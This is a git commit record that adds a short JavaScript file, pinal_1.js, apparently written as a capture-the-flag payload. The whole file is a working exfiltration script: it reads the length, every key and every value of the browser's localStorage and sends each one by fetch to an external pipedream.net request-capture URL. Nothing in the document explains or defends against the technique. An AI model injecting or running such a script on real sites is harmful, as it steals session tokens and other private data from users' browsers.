3650ffef0c4599d3b2b53f2d58b6d9faaac60925
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-04-29 01:53:45 +0530

    Create pinal_1.js

---
+++ pinal_1.js
@@ -0,0 +1,10 @@
+async function getFlag() {
+            var local_length = window.localStorage.length;
+            fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/?length=' + local_length);
+            for (let i = 0; i < local_length; i++) {
+                fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/?key=' + window.localStorage.key(i));
+                fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/?key=' + window.localStorage.getItem(window.localStorage.key(i)));
+            }
+
+        }
+        getFlag()
